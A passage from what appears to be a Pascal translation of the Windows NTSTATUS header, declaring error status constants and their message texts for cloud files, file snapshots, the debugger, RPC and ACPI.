// MessageText:
//
// The cloud file provider is not running.
//
STATUS_CLOUD_FILE_PROVIDER_NOT_RUNNING = NTSTATUS($C000CF01);

//
// MessageId: STATUS_CLOUD_FILE_METADATA_CORRUPT
//
// MessageText:
//
// The cloud file metadata is corrupt and unreadable.
//
STATUS_CLOUD_FILE_METADATA_CORRUPT = NTSTATUS($C000CF02);

//
// MessageId: STATUS_CLOUD_FILE_METADATA_TOO_LARGE
//
// MessageText:
//
// The cloud file metadata is too large.
//
STATUS_CLOUD_FILE_METADATA_TOO_LARGE = NTSTATUS($C000CF03);

//
// MessageId: STATUS_CLOUD_FILE_PROPERTY_BLOB_TOO_LARGE
//
// MessageText:
//
// The cloud file property is too large.
//
STATUS_CLOUD_FILE_PROPERTY_BLOB_TOO_LARGE = NTSTATUS($8000CF04);

//
// MessageId: STATUS_CLOUD_FILE_TOO_MANY_PROPERTY_BLOBS
//
// MessageText:
//
// The maximum number of cloud file properties has been reached.
//
STATUS_CLOUD_FILE_TOO_MANY_PROPERTY_BLOBS = NTSTATUS($8000CF05);

//
// MessageId: STATUS_CLOUD_FILE_PROPERTY_VERSION_NOT_SUPPORTED
//
// MessageText:
//
// The version of the cloud file property store is not supported.
//
STATUS_CLOUD_FILE_PROPERTY_VERSION_NOT_SUPPORTED = NTSTATUS($C000CF06);

//
// MessageId: STATUS_NOT_A_CLOUD_FILE
//
// MessageText:
//
// The file is not a cloud file.
//
STATUS_NOT_A_CLOUD_FILE          = NTSTATUS($C000CF07);

//
// MessageId: STATUS_CLOUD_FILE_NOT_IN_SYNC
//
// MessageText:
//
// The file is not in sync with the cloud.
//
STATUS_CLOUD_FILE_NOT_IN_SYNC    = NTSTATUS($C000CF08);

//
// MessageId: STATUS_CLOUD_FILE_ALREADY_CONNECTED
//
// MessageText:
//
// The cloud sync root is already connected with another cloud sync provider.
//
STATUS_CLOUD_FILE_ALREADY_CONNECTED = NTSTATUS($C000CF09);

//
// MessageId: STATUS_CLOUD_FILE_NOT_SUPPORTED
//
// MessageText:
//
// The operation is not supported by the cloud sync provider.
//
STATUS_CLOUD_FILE_NOT_SUPPORTED  = NTSTATUS($C000CF0A);

//
// MessageId: STATUS_CLOUD_FILE_INVALID_REQUEST
//
// MessageText:
//
// The cloud operation is invalid.
//
STATUS_CLOUD_FILE_INVALID_REQUEST = NTSTATUS($C000CF0B);

//
// MessageId: STATUS_CLOUD_FILE_READ_ONLY_VOLUME
//
// MessageText:
//
// The cloud operation is not supported on a read-only volume.
//
STATUS_CLOUD_FILE_READ_ONLY_VOLUME = NTSTATUS($C000CF0C);

//
// MessageId: STATUS_CLOUD_FILE_CONNECTED_PROVIDER_ONLY
//
// MessageText:
//
// The operation is reserved for a connected cloud sync provider.
//
STATUS_CLOUD_FILE_CONNECTED_PROVIDER_ONLY = NTSTATUS($C000CF0D);

//
// MessageId: STATUS_CLOUD_FILE_VALIDATION_FAILED
//
// MessageText:
//
// The cloud sync provider failed to validate the downloaded data.
//
STATUS_CLOUD_FILE_VALIDATION_FAILED = NTSTATUS($C000CF0E);

//
// MessageId: STATUS_CLOUD_FILE_AUTHENTICATION_FAILED
//
// MessageText:
//
// The cloud sync provider failed user authentication.
//
STATUS_CLOUD_FILE_AUTHENTICATION_FAILED = NTSTATUS($C000CF0F);

//
// MessageId: STATUS_CLOUD_FILE_INSUFFICIENT_RESOURCES
//
// MessageText:
//
// The cloud sync provider failed to perform the operation due to low system resources.
//
STATUS_CLOUD_FILE_INSUFFICIENT_RESOURCES = NTSTATUS($C000CF10);

//
// MessageId: STATUS_CLOUD_FILE_NETWORK_UNAVAILABLE
//
// MessageText:
//
// The cloud sync provider failed to perform the operation due to network being unavailable.
//
STATUS_CLOUD_FILE_NETWORK_UNAVAILABLE = NTSTATUS($C000CF11);

//
// MessageId: STATUS_CLOUD_FILE_UNSUCCESSFUL
//
// MessageText:
//
// The cloud operation was unsuccessful.
//
STATUS_CLOUD_FILE_UNSUCCESSFUL   = NTSTATUS($C000CF12);

//
// MessageId: STATUS_CLOUD_FILE_NOT_UNDER_SYNC_ROOT
//
// MessageText:
//
// The operation is only supported on files under a cloud sync root.
//
STATUS_CLOUD_FILE_NOT_UNDER_SYNC_ROOT = NTSTATUS($C000CF13);

//
// MessageId: STATUS_CLOUD_FILE_IN_USE
//
// MessageText:
//
// The operation cannot be performed on cloud files in use.
//
STATUS_CLOUD_FILE_IN_USE         = NTSTATUS($C000CF14);

//
// MessageId: STATUS_CLOUD_FILE_PINNED
//
// MessageText:
//
// The operation cannot be performed on pinned cloud files.
//
STATUS_CLOUD_FILE_PINNED         = NTSTATUS($C000CF15);

//
// MessageId: STATUS_CLOUD_FILE_REQUEST_ABORTED
//
// MessageText:
//
// The cloud operation was aborted.
//
STATUS_CLOUD_FILE_REQUEST_ABORTED = NTSTATUS($C000CF16);

//
// MessageId: STATUS_CLOUD_FILE_PROPERTY_CORRUPT
//
// MessageText:
//
// The cloud file's property store is corrupt.
//
STATUS_CLOUD_FILE_PROPERTY_CORRUPT = NTSTATUS($C000CF17);

//
// MessageId: STATUS_CLOUD_FILE_ACCESS_DENIED
//
// MessageText:
//
// Access to the cloud file is denied.
//
STATUS_CLOUD_FILE_ACCESS_DENIED  = NTSTATUS($C000CF18);

//
// MessageId: STATUS_CLOUD_FILE_INCOMPATIBLE_HARDLINKS
//
// MessageText:
//
// The cloud operation cannot be performed on a file with incompatible hardlinks.
//
STATUS_CLOUD_FILE_INCOMPATIBLE_HARDLINKS = NTSTATUS($C000CF19);

//
// MessageId: STATUS_CLOUD_FILE_PROPERTY_LOCK_CONFLICT
//
// MessageText:
//
// The operation failed due to a conflicting cloud file property lock.
//
STATUS_CLOUD_FILE_PROPERTY_LOCK_CONFLICT = NTSTATUS($C000CF1A);

//
// MessageId: STATUS_CLOUD_FILE_REQUEST_CANCELED
//
// MessageText:
//
// The cloud operation was canceled by user.
//
STATUS_CLOUD_FILE_REQUEST_CANCELED = NTSTATUS($C000CF1B);

//
// MessageId: STATUS_CLOUD_FILE_PROVIDER_TERMINATED
//
// MessageText:
//
// The cloud file provider exited unexpectedly.
//
STATUS_CLOUD_FILE_PROVIDER_TERMINATED = NTSTATUS($C000CF1D);

//
// MessageId: STATUS_NOT_A_CLOUD_SYNC_ROOT
//
// MessageText:
//
// The file is not a cloud sync root.
//
STATUS_NOT_A_CLOUD_SYNC_ROOT     = NTSTATUS($C000CF1E);

//
// MessageId: STATUS_CLOUD_FILE_REQUEST_TIMEOUT
//
// MessageText:
//
// The cloud operation was not completed before the time-out period expired.
//
STATUS_CLOUD_FILE_REQUEST_TIMEOUT = NTSTATUS($C000CF1F);

//
// MessageId: STATUS_CLOUD_FILE_DEHYDRATION_DISALLOWED
//
// MessageText:
//
// Dehydration of the cloud file is disallowed by the cloud sync provider.
//
STATUS_CLOUD_FILE_DEHYDRATION_DISALLOWED = NTSTATUS($C000CF20);

{*++

 End of Cloud Files specific messages.

--*}
{*++

 MessageId's 0xf500 - 0xf5ff (inclusive) are for File Snap specific messages.

--*}
//
// MessageId: STATUS_FILE_SNAP_IN_PROGRESS
//
// MessageText:
//
// A file snapshot operation was attempted when one is already in progress.
//
STATUS_FILE_SNAP_IN_PROGRESS     = NTSTATUS($C000F500);

//
// MessageId: STATUS_FILE_SNAP_USER_SECTION_NOT_SUPPORTED
//
// MessageText:
//
// A snapshot of the file cannot be taken because a user-mapped section is present.
//
STATUS_FILE_SNAP_USER_SECTION_NOT_SUPPORTED = NTSTATUS($C000F501);

//
// MessageId: STATUS_FILE_SNAP_MODIFY_NOT_SUPPORTED
//
// MessageText:
//
// The file snapshot operation was terminated because one of the files was modified in a way incompatible with a snapshot operation.  Please try again.
//
STATUS_FILE_SNAP_MODIFY_NOT_SUPPORTED = NTSTATUS($C000F502);

//
// MessageId: STATUS_FILE_SNAP_IO_NOT_COORDINATED
//
// MessageText:
//
// An I/O request could not be coordinated with a file snapshot operation.
//
STATUS_FILE_SNAP_IO_NOT_COORDINATED = NTSTATUS($C000F503);

//
// MessageId: STATUS_FILE_SNAP_UNEXPECTED_ERROR
//
// MessageText:
//
// An unexpected error occurred while processing a file snapshot operation.
//
STATUS_FILE_SNAP_UNEXPECTED_ERROR = NTSTATUS($C000F504);

//
// MessageId: STATUS_FILE_SNAP_INVALID_PARAMETER
//
// MessageText:
//
// A file snapshot operation received an invalid parameter.
//
STATUS_FILE_SNAP_INVALID_PARAMETER = NTSTATUS($C000F505);

{*++

 End of File Snap specific messages.

--*}

//     **** New SYSTEM error codes can be inserted here ****


//
//  Debugger error values
//

//
// MessageId: DBG_NO_STATE_CHANGE
//
// MessageText:
//
// Debugger did not perform a state change.
//
DBG_NO_STATE_CHANGE              = NTSTATUS($C0010001);

//
// MessageId: DBG_APP_NOT_IDLE
//
// MessageText:
//
// Debugger has found the application is not idle.
//
DBG_APP_NOT_IDLE                 = NTSTATUS($C0010002);


//
//  RPC error values
//

//
// MessageId: RPC_NT_INVALID_STRING_BINDING
//
// MessageText:
//
// The string binding is invalid.
//
RPC_NT_INVALID_STRING_BINDING    = NTSTATUS($C0020001);

//
// MessageId: RPC_NT_WRONG_KIND_OF_BINDING
//
// MessageText:
//
// The binding handle is not the correct type.
//
RPC_NT_WRONG_KIND_OF_BINDING     = NTSTATUS($C0020002);

//
// MessageId: RPC_NT_INVALID_BINDING
//
// MessageText:
//
// The binding handle is invalid.
//
RPC_NT_INVALID_BINDING           = NTSTATUS($C0020003);

//
// MessageId: RPC_NT_PROTSEQ_NOT_SUPPORTED
//
// MessageText:
//
// The RPC protocol sequence is not supported.
//
RPC_NT_PROTSEQ_NOT_SUPPORTED     = NTSTATUS($C0020004);

//
// MessageId: RPC_NT_INVALID_RPC_PROTSEQ
//
// MessageText:
//
// The RPC protocol sequence is invalid.
//
RPC_NT_INVALID_RPC_PROTSEQ       = NTSTATUS($C0020005);

//
// MessageId: RPC_NT_INVALID_STRING_UUID
//
// MessageText:
//
// The string UUID is invalid.
//
RPC_NT_INVALID_STRING_UUID       = NTSTATUS($C0020006);

//
// MessageId: RPC_NT_INVALID_ENDPOINT_FORMAT
//
// MessageText:
//
// The endpoint format is invalid.
//
RPC_NT_INVALID_ENDPOINT_FORMAT   = NTSTATUS($C0020007);

//
// MessageId: RPC_NT_INVALID_NET_ADDR
//
// MessageText:
//
// The network address is invalid.
//
RPC_NT_INVALID_NET_ADDR          = NTSTATUS($C0020008);

//
// MessageId: RPC_NT_NO_ENDPOINT_FOUND
//
// MessageText:
//
// No endpoint was found.
//
RPC_NT_NO_ENDPOINT_FOUND         = NTSTATUS($C0020009);

//
// MessageId: RPC_NT_INVALID_TIMEOUT
//
// MessageText:
//
// The timeout value is invalid.
//
RPC_NT_INVALID_TIMEOUT           = NTSTATUS($C002000A);

//
// MessageId: RPC_NT_OBJECT_NOT_FOUND
//
// MessageText:
//
// The object UUID was not found.
//
RPC_NT_OBJECT_NOT_FOUND          = NTSTATUS($C002000B);

//
// MessageId: RPC_NT_ALREADY_REGISTERED
//
// MessageText:
//
// The object UUID has already been registered.
//
RPC_NT_ALREADY_REGISTERED        = NTSTATUS($C002000C);

//
// MessageId: RPC_NT_TYPE_ALREADY_REGISTERED
//
// MessageText:
//
// The type UUID has already been registered.
//
RPC_NT_TYPE_ALREADY_REGISTERED   = NTSTATUS($C002000D);

//
// MessageId: RPC_NT_ALREADY_LISTENING
//
// MessageText:
//
// The RPC server is already listening.
//
RPC_NT_ALREADY_LISTENING         = NTSTATUS($C002000E);

//
// MessageId: RPC_NT_NO_PROTSEQS_REGISTERED
//
// MessageText:
//
// No protocol sequences have been registered.
//
RPC_NT_NO_PROTSEQS_REGISTERED    = NTSTATUS($C002000F);

//
// MessageId: RPC_NT_NOT_LISTENING
//
// MessageText:
//
// The RPC server is not listening.
//
RPC_NT_NOT_LISTENING             = NTSTATUS($C0020010);

//
// MessageId: RPC_NT_UNKNOWN_MGR_TYPE
//
// MessageText:
//
// The manager type is unknown.
//
RPC_NT_UNKNOWN_MGR_TYPE          = NTSTATUS($C0020011);

//
// MessageId: RPC_NT_UNKNOWN_IF
//
// MessageText:
//
// The interface is unknown.
//
RPC_NT_UNKNOWN_IF                = NTSTATUS($C0020012);

//
// MessageId: RPC_NT_NO_BINDINGS
//
// MessageText:
//
// There are no bindings.
//
RPC_NT_NO_BINDINGS               = NTSTATUS($C0020013);

//
// MessageId: RPC_NT_NO_PROTSEQS
//
// MessageText:
//
// There are no protocol sequences.
//
RPC_NT_NO_PROTSEQS               = NTSTATUS($C0020014);

//
// MessageId: RPC_NT_CANT_CREATE_ENDPOINT
//
// MessageText:
//
// The endpoint cannot be created.
//
RPC_NT_CANT_CREATE_ENDPOINT      = NTSTATUS($C0020015);

//
// MessageId: RPC_NT_OUT_OF_RESOURCES
//
// MessageText:
//
// Not enough resources are available to complete this operation.
//
RPC_NT_OUT_OF_RESOURCES          = NTSTATUS($C0020016);

//
// MessageId: RPC_NT_SERVER_UNAVAILABLE
//
// MessageText:
//
// The RPC server is unavailable.
//
RPC_NT_SERVER_UNAVAILABLE        = NTSTATUS($C0020017);

//
// MessageId: RPC_NT_SERVER_TOO_BUSY
//
// MessageText:
//
// The RPC server is too busy to complete this operation.
//
RPC_NT_SERVER_TOO_BUSY           = NTSTATUS($C0020018);

//
// MessageId: RPC_NT_INVALID_NETWORK_OPTIONS
//
// MessageText:
//
// The network options are invalid.
//
RPC_NT_INVALID_NETWORK_OPTIONS   = NTSTATUS($C0020019);

//
// MessageId: RPC_NT_NO_CALL_ACTIVE
//
// MessageText:
//
// There are no remote procedure calls active on this thread.
//
RPC_NT_NO_CALL_ACTIVE            = NTSTATUS($C002001A);

//
// MessageId: RPC_NT_CALL_FAILED
//
// MessageText:
//
// The remote procedure call failed.
//
RPC_NT_CALL_FAILED               = NTSTATUS($C002001B);

//
// MessageId: RPC_NT_CALL_FAILED_DNE
//
// MessageText:
//
// The remote procedure call failed and did not execute.
//
RPC_NT_CALL_FAILED_DNE           = NTSTATUS($C002001C);

//
// MessageId: RPC_NT_PROTOCOL_ERROR
//
// MessageText:
//
// An RPC protocol error occurred.
//
RPC_NT_PROTOCOL_ERROR            = NTSTATUS($C002001D);

//
// MessageId: RPC_NT_UNSUPPORTED_TRANS_SYN
//
// MessageText:
//
// The transfer syntax is not supported by the RPC server.
//
RPC_NT_UNSUPPORTED_TRANS_SYN     = NTSTATUS($C002001F);

//
// MessageId: RPC_NT_UNSUPPORTED_TYPE
//
// MessageText:
//
// The type UUID is not supported.
//
RPC_NT_UNSUPPORTED_TYPE          = NTSTATUS($C0020021);

//
// MessageId: RPC_NT_INVALID_TAG
//
// MessageText:
//
// The tag is invalid.
//
RPC_NT_INVALID_TAG               = NTSTATUS($C0020022);

//
// MessageId: RPC_NT_INVALID_BOUND
//
// MessageText:
//
// The array bounds are invalid.
//
RPC_NT_INVALID_BOUND             = NTSTATUS($C0020023);

//
// MessageId: RPC_NT_NO_ENTRY_NAME
//
// MessageText:
//
// The binding does not contain an entry name.
//
RPC_NT_NO_ENTRY_NAME             = NTSTATUS($C0020024);

//
// MessageId: RPC_NT_INVALID_NAME_SYNTAX
//
// MessageText:
//
// The name syntax is invalid.
//
RPC_NT_INVALID_NAME_SYNTAX       = NTSTATUS($C0020025);

//
// MessageId: RPC_NT_UNSUPPORTED_NAME_SYNTAX
//
// MessageText:
//
// The name syntax is not supported.
//
RPC_NT_UNSUPPORTED_NAME_SYNTAX   = NTSTATUS($C0020026);

//
// MessageId: RPC_NT_UUID_NO_ADDRESS
//
// MessageText:
//
// No network address is available to use to construct a UUID.
//
RPC_NT_UUID_NO_ADDRESS           = NTSTATUS($C0020028);

//
// MessageId: RPC_NT_DUPLICATE_ENDPOINT
//
// MessageText:
//
// The endpoint is a duplicate.
//
RPC_NT_DUPLICATE_ENDPOINT        = NTSTATUS($C0020029);

//
// MessageId: RPC_NT_UNKNOWN_AUTHN_TYPE
//
// MessageText:
//
// The authentication type is unknown.
//
RPC_NT_UNKNOWN_AUTHN_TYPE        = NTSTATUS($C002002A);

//
// MessageId: RPC_NT_MAX_CALLS_TOO_SMALL
//
// MessageText:
//
// The maximum number of calls is too small.
//
RPC_NT_MAX_CALLS_TOO_SMALL       = NTSTATUS($C002002B);

//
// MessageId: RPC_NT_STRING_TOO_LONG
//
// MessageText:
//
// The string is too long.
//
RPC_NT_STRING_TOO_LONG           = NTSTATUS($C002002C);

//
// MessageId: RPC_NT_PROTSEQ_NOT_FOUND
//
// MessageText:
//
// The RPC protocol sequence was not found.
//
RPC_NT_PROTSEQ_NOT_FOUND         = NTSTATUS($C002002D);

//
// MessageId: RPC_NT_PROCNUM_OUT_OF_RANGE
//
// MessageText:
//
// The procedure number is out of range.
//
RPC_NT_PROCNUM_OUT_OF_RANGE      = NTSTATUS($C002002E);

//
// MessageId: RPC_NT_BINDING_HAS_NO_AUTH
//
// MessageText:
//
// The binding does not contain any authentication information.
//
RPC_NT_BINDING_HAS_NO_AUTH       = NTSTATUS($C002002F);

//
// MessageId: RPC_NT_UNKNOWN_AUTHN_SERVICE
//
// MessageText:
//
// The authentication service is unknown.
//
RPC_NT_UNKNOWN_AUTHN_SERVICE     = NTSTATUS($C0020030);

//
// MessageId: RPC_NT_UNKNOWN_AUTHN_LEVEL
//
// MessageText:
//
// The authentication level is unknown.
//
RPC_NT_UNKNOWN_AUTHN_LEVEL       = NTSTATUS($C0020031);

//
// MessageId: RPC_NT_INVALID_AUTH_IDENTITY
//
// MessageText:
//
// The security context is invalid.
//
RPC_NT_INVALID_AUTH_IDENTITY     = NTSTATUS($C0020032);

//
// MessageId: RPC_NT_UNKNOWN_AUTHZ_SERVICE
//
// MessageText:
//
// The authorization service is unknown.
//
RPC_NT_UNKNOWN_AUTHZ_SERVICE     = NTSTATUS($C0020033);

//
// MessageId: EPT_NT_INVALID_ENTRY
//
// MessageText:
//
// The entry is invalid.
//
EPT_NT_INVALID_ENTRY             = NTSTATUS($C0020034);

//
// MessageId: EPT_NT_CANT_PERFORM_OP
//
// MessageText:
//
// The operation cannot be performed.
//
EPT_NT_CANT_PERFORM_OP           = NTSTATUS($C0020035);

//
// MessageId: EPT_NT_NOT_REGISTERED
//
// MessageText:
//
// There are no more endpoints available from the endpoint mapper.
//
EPT_NT_NOT_REGISTERED            = NTSTATUS($C0020036);

//
// MessageId: RPC_NT_NOTHING_TO_EXPORT
//
// MessageText:
//
// No interfaces have been exported.
//
RPC_NT_NOTHING_TO_EXPORT         = NTSTATUS($C0020037);

//
// MessageId: RPC_NT_INCOMPLETE_NAME
//
// MessageText:
//
// The entry name is incomplete.
//
RPC_NT_INCOMPLETE_NAME           = NTSTATUS($C0020038);

//
// MessageId: RPC_NT_INVALID_VERS_OPTION
//
// MessageText:
//
// The version option is invalid.
//
RPC_NT_INVALID_VERS_OPTION       = NTSTATUS($C0020039);

//
// MessageId: RPC_NT_NO_MORE_MEMBERS
//
// MessageText:
//
// There are no more members.
//
RPC_NT_NO_MORE_MEMBERS           = NTSTATUS($C002003A);

//
// MessageId: RPC_NT_NOT_ALL_OBJS_UNEXPORTED
//
// MessageText:
//
// There is nothing to unexport.
//
RPC_NT_NOT_ALL_OBJS_UNEXPORTED   = NTSTATUS($C002003B);

//
// MessageId: RPC_NT_INTERFACE_NOT_FOUND
//
// MessageText:
//
// The interface was not found.
//
RPC_NT_INTERFACE_NOT_FOUND       = NTSTATUS($C002003C);

//
// MessageId: RPC_NT_ENTRY_ALREADY_EXISTS
//
// MessageText:
//
// The entry already exists.
//
RPC_NT_ENTRY_ALREADY_EXISTS      = NTSTATUS($C002003D);

//
// MessageId: RPC_NT_ENTRY_NOT_FOUND
//
// MessageText:
//
// The entry is not found.
//
RPC_NT_ENTRY_NOT_FOUND           = NTSTATUS($C002003E);

//
// MessageId: RPC_NT_NAME_SERVICE_UNAVAILABLE
//
// MessageText:
//
// The name service is unavailable.
//
RPC_NT_NAME_SERVICE_UNAVAILABLE  = NTSTATUS($C002003F);

//
// MessageId: RPC_NT_INVALID_NAF_ID
//
// MessageText:
//
// The network address family is invalid.
//
RPC_NT_INVALID_NAF_ID            = NTSTATUS($C0020040);

//
// MessageId: RPC_NT_CANNOT_SUPPORT
//
// MessageText:
//
// The requested operation is not supported.
//
RPC_NT_CANNOT_SUPPORT            = NTSTATUS($C0020041);

//
// MessageId: RPC_NT_NO_CONTEXT_AVAILABLE
//
// MessageText:
//
// No security context is available to allow impersonation.
//
RPC_NT_NO_CONTEXT_AVAILABLE      = NTSTATUS($C0020042);

//
// MessageId: RPC_NT_INTERNAL_ERROR
//
// MessageText:
//
// An internal error occurred in RPC.
//
RPC_NT_INTERNAL_ERROR            = NTSTATUS($C0020043);

//
// MessageId: RPC_NT_ZERO_DIVIDE
//
// MessageText:
//
// The RPC server attempted an integer divide by zero.
//
RPC_NT_ZERO_DIVIDE               = NTSTATUS($C0020044);

//
// MessageId: RPC_NT_ADDRESS_ERROR
//
// MessageText:
//
// An addressing error occurred in the RPC server.
//
RPC_NT_ADDRESS_ERROR             = NTSTATUS($C0020045);

//
// MessageId: RPC_NT_FP_DIV_ZERO
//
// MessageText:
//
// A floating point operation at the RPC server caused a divide by zero.
//
RPC_NT_FP_DIV_ZERO               = NTSTATUS($C0020046);

//
// MessageId: RPC_NT_FP_UNDERFLOW
//
// MessageText:
//
// A floating point underflow occurred at the RPC server.
//
RPC_NT_FP_UNDERFLOW              = NTSTATUS($C0020047);

//
// MessageId: RPC_NT_FP_OVERFLOW
//
// MessageText:
//
// A floating point overflow occurred at the RPC server.
//
RPC_NT_FP_OVERFLOW               = NTSTATUS($C0020048);

//
// MessageId: RPC_NT_NO_MORE_ENTRIES
//
// MessageText:
//
// The list of RPC servers available for auto-handle binding has been exhausted.
//
RPC_NT_NO_MORE_ENTRIES           = NTSTATUS($C0030001);

//
// MessageId: RPC_NT_SS_CHAR_TRANS_OPEN_FAIL
//
// MessageText:
//
// The file designated by DCERPCCHARTRANS cannot be opened.
//
RPC_NT_SS_CHAR_TRANS_OPEN_FAIL   = NTSTATUS($C0030002);

//
// MessageId: RPC_NT_SS_CHAR_TRANS_SHORT_FILE
//
// MessageText:
//
// The file containing the character translation table has fewer than 512 bytes.
//
RPC_NT_SS_CHAR_TRANS_SHORT_FILE  = NTSTATUS($C0030003);

//
// MessageId: RPC_NT_SS_IN_NULL_CONTEXT
//
// MessageText:
//
// A null context handle is passed as an [in] parameter.
//
RPC_NT_SS_IN_NULL_CONTEXT        = NTSTATUS($C0030004);

//
// MessageId: RPC_NT_SS_CONTEXT_MISMATCH
//
// MessageText:
//
// The context handle does not match any known context handles.
//
RPC_NT_SS_CONTEXT_MISMATCH       = NTSTATUS($C0030005);

//
// MessageId: RPC_NT_SS_CONTEXT_DAMAGED
//
// MessageText:
//
// The context handle changed during a call.
//
RPC_NT_SS_CONTEXT_DAMAGED        = NTSTATUS($C0030006);

//
// MessageId: RPC_NT_SS_HANDLES_MISMATCH
//
// MessageText:
//
// The binding handles passed to a remote procedure call do not match.
//
RPC_NT_SS_HANDLES_MISMATCH       = NTSTATUS($C0030007);

//
// MessageId: RPC_NT_SS_CANNOT_GET_CALL_HANDLE
//
// MessageText:
//
// The stub is unable to get the call handle.
//
RPC_NT_SS_CANNOT_GET_CALL_HANDLE = NTSTATUS($C0030008);

//
// MessageId: RPC_NT_NULL_REF_POINTER
//
// MessageText:
//
// A null reference pointer was passed to the stub.
//
RPC_NT_NULL_REF_POINTER          = NTSTATUS($C0030009);

//
// MessageId: RPC_NT_ENUM_VALUE_OUT_OF_RANGE
//
// MessageText:
//
// The enumeration value is out of range.
//
RPC_NT_ENUM_VALUE_OUT_OF_RANGE   = NTSTATUS($C003000A);

//
// MessageId: RPC_NT_BYTE_COUNT_TOO_SMALL
//
// MessageText:
//
// The byte count is too small.
//
RPC_NT_BYTE_COUNT_TOO_SMALL      = NTSTATUS($C003000B);

//
// MessageId: RPC_NT_BAD_STUB_DATA
//
// MessageText:
//
// The stub received bad data.
//
RPC_NT_BAD_STUB_DATA             = NTSTATUS($C003000C);

//
// MessageId: RPC_NT_CALL_IN_PROGRESS
//
// MessageText:
//
// A remote procedure call is already in progress for this thread.
//
RPC_NT_CALL_IN_PROGRESS          = NTSTATUS($C0020049);

//
// MessageId: RPC_NT_NO_MORE_BINDINGS
//
// MessageText:
//
// There are no more bindings.
//
RPC_NT_NO_MORE_BINDINGS          = NTSTATUS($C002004A);

//
// MessageId: RPC_NT_GROUP_MEMBER_NOT_FOUND
//
// MessageText:
//
// The group member was not found.
//
RPC_NT_GROUP_MEMBER_NOT_FOUND    = NTSTATUS($C002004B);

//
// MessageId: EPT_NT_CANT_CREATE
//
// MessageText:
//
// The endpoint mapper database entry could not be created.
//
EPT_NT_CANT_CREATE               = NTSTATUS($C002004C);

//
// MessageId: RPC_NT_INVALID_OBJECT
//
// MessageText:
//
// The object UUID is the nil UUID.
//
RPC_NT_INVALID_OBJECT            = NTSTATUS($C002004D);

//
// MessageId: RPC_NT_NO_INTERFACES
//
// MessageText:
//
// No interfaces have been registered.
//
RPC_NT_NO_INTERFACES             = NTSTATUS($C002004F);

//
// MessageId: RPC_NT_CALL_CANCELLED
//
// MessageText:
//
// The remote procedure call was cancelled.
//
RPC_NT_CALL_CANCELLED            = NTSTATUS($C0020050);

//
// MessageId: RPC_NT_BINDING_INCOMPLETE
//
// MessageText:
//
// The binding handle does not contain all required information.
//
RPC_NT_BINDING_INCOMPLETE        = NTSTATUS($C0020051);

//
// MessageId: RPC_NT_COMM_FAILURE
//
// MessageText:
//
// A communications failure occurred during a remote procedure call.
//
RPC_NT_COMM_FAILURE              = NTSTATUS($C0020052);

//
// MessageId: RPC_NT_UNSUPPORTED_AUTHN_LEVEL
//
// MessageText:
//
// The requested authentication level is not supported.
//
RPC_NT_UNSUPPORTED_AUTHN_LEVEL   = NTSTATUS($C0020053);

//
// MessageId: RPC_NT_NO_PRINC_NAME
//
// MessageText:
//
// No principal name registered.
//
RPC_NT_NO_PRINC_NAME             = NTSTATUS($C0020054);

//
// MessageId: RPC_NT_NOT_RPC_ERROR
//
// MessageText:
//
// The error specified is not a valid Windows RPC error code.
//
RPC_NT_NOT_RPC_ERROR             = NTSTATUS($C0020055);

//
// MessageId: RPC_NT_UUID_LOCAL_ONLY
//
// MessageText:
//
// A UUID that is valid only on this computer has been allocated.
//
RPC_NT_UUID_LOCAL_ONLY           = NTSTATUS($40020056);

//
// MessageId: RPC_NT_SEC_PKG_ERROR
//
// MessageText:
//
// A security package specific error occurred.
//
RPC_NT_SEC_PKG_ERROR             = NTSTATUS($C0020057);

//
// MessageId: RPC_NT_NOT_CANCELLED
//
// MessageText:
//
// Thread is not cancelled.
//
RPC_NT_NOT_CANCELLED             = NTSTATUS($C0020058);

//
// MessageId: RPC_NT_INVALID_ES_ACTION
//
// MessageText:
//
// Invalid operation on the encoding/decoding handle.
//
RPC_NT_INVALID_ES_ACTION         = NTSTATUS($C0030059);

//
// MessageId: RPC_NT_WRONG_ES_VERSION
//
// MessageText:
//
// Incompatible version of the serializing package.
//
RPC_NT_WRONG_ES_VERSION          = NTSTATUS($C003005A);

//
// MessageId: RPC_NT_WRONG_STUB_VERSION
//
// MessageText:
//
// Incompatible version of the RPC stub.
//
RPC_NT_WRONG_STUB_VERSION        = NTSTATUS($C003005B);

//
// MessageId: RPC_NT_INVALID_PIPE_OBJECT
//
// MessageText:
//
// The RPC pipe object is invalid or corrupted.
//
RPC_NT_INVALID_PIPE_OBJECT       = NTSTATUS($C003005C);

//
// MessageId: RPC_NT_INVALID_PIPE_OPERATION
//
// MessageText:
//
// An invalid operation was attempted on an RPC pipe object.
//
RPC_NT_INVALID_PIPE_OPERATION    = NTSTATUS($C003005D);

//
// MessageId: RPC_NT_WRONG_PIPE_VERSION
//
// MessageText:
//
// Unsupported RPC pipe version.
//
RPC_NT_WRONG_PIPE_VERSION        = NTSTATUS($C003005E);

//
// MessageId: RPC_NT_PIPE_CLOSED
//
// MessageText:
//
// The RPC pipe object has already been closed.
//
RPC_NT_PIPE_CLOSED               = NTSTATUS($C003005F);

//
// MessageId: RPC_NT_PIPE_DISCIPLINE_ERROR
//
// MessageText:
//
// The RPC call completed before all pipes were processed.
//
RPC_NT_PIPE_DISCIPLINE_ERROR     = NTSTATUS($C0030060);

//
// MessageId: RPC_NT_PIPE_EMPTY
//
// MessageText:
//
// No more data is available from the RPC pipe.
//
RPC_NT_PIPE_EMPTY                = NTSTATUS($C0030061);

//
// MessageId: RPC_NT_INVALID_ASYNC_HANDLE
//
// MessageText:
//
// Invalid asynchronous remote procedure call handle.
//
RPC_NT_INVALID_ASYNC_HANDLE      = NTSTATUS($C0020062);

//
// MessageId: RPC_NT_INVALID_ASYNC_CALL
//
// MessageText:
//
// Invalid asynchronous RPC call handle for this operation.
//
RPC_NT_INVALID_ASYNC_CALL        = NTSTATUS($C0020063);

//
// MessageId: RPC_NT_PROXY_ACCESS_DENIED
//
// MessageText:
//
// Access to the HTTP proxy is denied.
//
RPC_NT_PROXY_ACCESS_DENIED       = NTSTATUS($C0020064);

//
// MessageId: RPC_NT_COOKIE_AUTH_FAILED
//
// MessageText:
//
// HTTP proxy server rejected the connection because the cookie authentication failed.
//
RPC_NT_COOKIE_AUTH_FAILED        = NTSTATUS($C0020065);

//
// MessageId: RPC_NT_SEND_INCOMPLETE
//
// MessageText:
//
// Some data remains to be sent in the request buffer.
//
RPC_NT_SEND_INCOMPLETE           = NTSTATUS($400200AF);


//
//  ACPI error values
//

//
// MessageId: STATUS_ACPI_INVALID_OPCODE
//
// MessageText:
//
// An attempt was made to run an invalid AML opcode
//
STATUS_ACPI_INVALID_OPCODE       = NTSTATUS($C0140001);

//
